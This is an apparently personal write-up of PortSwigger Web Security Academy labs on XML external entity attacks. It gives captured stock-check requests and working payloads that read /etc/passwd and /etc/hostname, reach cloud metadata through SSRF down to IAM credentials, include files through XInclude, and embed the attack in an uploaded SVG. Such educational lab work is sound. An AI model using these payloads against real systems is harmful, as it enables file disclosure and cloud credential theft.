This post will run through the labs on web sec academy by Portswigger related to XML external entity.  

XML is a language designed for storing and transporting data. The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. XML allows custom entities to be defined within the DTD. XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. 

### <u>Lab: Exploiting XXE using external entities to retrieve files
In this lab when we try to do a stock check for an item it sends a post request:
```
POST /product/stock HTTP/2
Host: 0a2700480350c46a80b76cd700fa0080.web-security-academy.net
Cookie: session=iu63PFnHTuz2RjVtdRCgLcgWBpMj3GbW
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2700480350c46a80b76cd700fa0080.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a2700480350c46a80b76cd700fa0080.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
As you can see it uses XML so we can try create an external entity which will return the contents of the file we want. We would have to modifiy the the request so that the XML is;
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId>
<storeId>1</storeId></stockCheck>
```

### <u>Lab: Exploiting XXE to perform SSRF attacks
For this lab we will have the same set up as last lab except we are trying to make a request to "http://169.254.169.254" so our external entity will be:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254"> ]>
```
When we send this request we get a an error "Invalid product ID: latest", which means it is returning us latest which is actually part of the endpoint to access instance metadata properties from within a running instance. So we then add "lastest/meta-data".
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
```
Using this we get the error "Invalid product ID: iam" so then we can add iam to the request as well until we get to the end which is:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

### <u>Lab: Exploiting XInclude to retrieve files
Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. When we try to check the stock this POST request is sent:
```
POST /product/stock HTTP/2
Host: 0a0000420309443f81333eef00720074.web-security-academy.net
Cookie: session=P7GAkzfB4BFYXas3NSNxVWLA9YYMp3gv
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0000420309443f81333eef00720074.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a0000420309443f81333eef00720074.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1&storeId=1
```
By injecting the below XML we are able to retrieve the contents of etc/passwd
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### <u>Lab: Exploiting XXE via image file upload
In some applications you can upload files and there are some common file types which are XML format like DOCX and SVG. Since in this lab we can upload images as our avatar in the comment section we can upload malicous SVG file that contains XML.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20" font="16">&xxe;</text>
</svg>
```
Uploading this file we can access and display the contents of the file we want since it creates a external entity which accesses the file and then we display this in our SVG as text.
